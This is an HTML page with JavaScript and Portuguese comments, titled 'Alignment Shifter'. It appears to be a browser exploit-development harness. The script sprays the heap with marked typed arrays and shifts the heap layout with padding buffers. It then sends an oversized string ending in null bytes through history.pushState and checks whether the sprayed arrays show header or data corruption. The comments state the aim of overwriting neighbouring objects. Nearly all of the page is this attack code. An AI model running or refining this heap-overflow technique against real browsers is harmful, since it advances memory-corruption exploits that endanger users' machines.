<!DOCTYPE html>
<html>
<head>
    <title>Alignment Shifter: Moving the Target</title>
    <style>
        body { background: #000; color: #00ffff; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #00aaaa; height: 350px; overflow-y: scroll; padding: 10px; background: #001111; color: #eef; margin-bottom: 15px;}
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
        button { 
            padding: 10px; font-weight: bold; cursor: pointer; 
            background: #003333; color: #0ff; border: 1px solid #007777; 
            font-size: 14px; 
        }
        button:hover { background: #0ff; color: #000; }
    </style>
</head>
<body>
    <h1>ALIGNMENT SHIFTER</h1>
    <p>Base: 709518 | Payload: 32 Bytes de ZEROS</p>
    <p>Objetivo: Empurrar os vizinhos para a linha de tiro.</p>

    <div id="logger" class="log">Escolha o deslocamento (Shift)...</div>

    <div class="grid">
        <button onclick="runShift(0)">Shift 0 (Padrão)</button>
        <button onclick="runShift(16)">Shift 16 Bytes</button>
        <button onclick="runShift(32)">Shift 32 Bytes</button>
        <button onclick="runShift(48)">Shift 48 Bytes</button>
        <button onclick="runShift(64)">Shift 64 Bytes</button>
        <button onclick="runShift(80)">Shift 80 Bytes</button>
        <button onclick="runShift(96)">Shift 96 Bytes</button>
        <button onclick="runShift(112)">Shift 112 Bytes</button>
        <button onclick="runShift(128)">Shift 128 Bytes</button>
        <button onclick="runShift(256)">Shift 256 Bytes</button>
    </div>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; 
        const MAGIC_NUM = 0x41414141;
        const SPRAY_SIZE = 10000;

        var spray = [];
        var shifter = []; // Segura o lixo para manter o deslocamento

        function log(msg, type) {
            const d = document.createElement('div');
            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) d.style.color = type;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runShift(shiftAmount) {
            log("---------------------------------------");
            log(`TESTANDO SHIFT: ${shiftAmount} Bytes`);
            
            // 1. Limpeza Total
            spray = null;
            shifter = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 300));
            spray = [];
            shifter = [];

            // 2. O DESLOCAMENTO (O "Calço")
            // Alocamos um ArrayBuffer inútil apenas para empurrar o ponteiro do Heap
            if(shiftAmount > 0) {
                // Criamos vários pequenos para garantir fragmentação alinhada
                for(let k=0; k<10; k++) {
                    shifter.push(new ArrayBuffer(shiftAmount));
                }
            }

            // 3. SPRAY (A Muralha)
            // Agora a muralha será construída um pouco mais para frente na memória
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; 
                arr[1] = i; 
                spray.push(arr);
            }

            log("Aguardando GC e Estabilização...");
            await new Promise(r => setTimeout(r, 800));

            try {
                // 4. PAYLOAD (Fixo e Seguro)
                let base = new Array(BASE_SIZE + 1).join('A');
                // 32 bytes de zeros é suficiente para matar um Header se acertarmos
                let overflow = new Array(33).join('\x00'); 
                let payload = base + overflow;

                history.pushState({}, "pwn_" + shiftAmount + "_" + Date.now(), payload);
                
                checkCorruption(shiftAmount);

            } catch(e) {
                log("ERRO: " + e.message, "red");
            }
        }

        function checkCorruption(shift) {
            let found = false;
            for(let i = spray.length - 1; i >= 0; i--) {
                let arr = spray[i];
                if(arr) {
                    // Se acertarmos o Header, o Length vai bugar (undefined ou 0)
                    // Se acertarmos o Magic, o valor vai mudar
                    let len = undefined;
                    let val = undefined;
                    
                    try { len = arr.length; } catch(e) {}
                    try { val = arr[0]; } catch(e) {}

                    if(len !== 1024 || val !== MAGIC_NUM) {
                        found = true;
                        document.body.style.background = "#0f0";
                        
                        let msg = `ALINHAMENTO ENCONTRADO!\nShift: ${shift}\nIndex: ${i}`;
                        if(len !== 1024) msg += `\nLength: ${len}`;
                        if(val !== MAGIC_NUM) msg += `\nData: 0x${val.toString(16)}`;
                        
                        alert(msg);
                        return;
                    }
                }
            }
            if(!found) log(`Shift ${shift}: Nada. O vizinho ainda está fora de alcance.`);
        }
    </script>
</body>
</html>
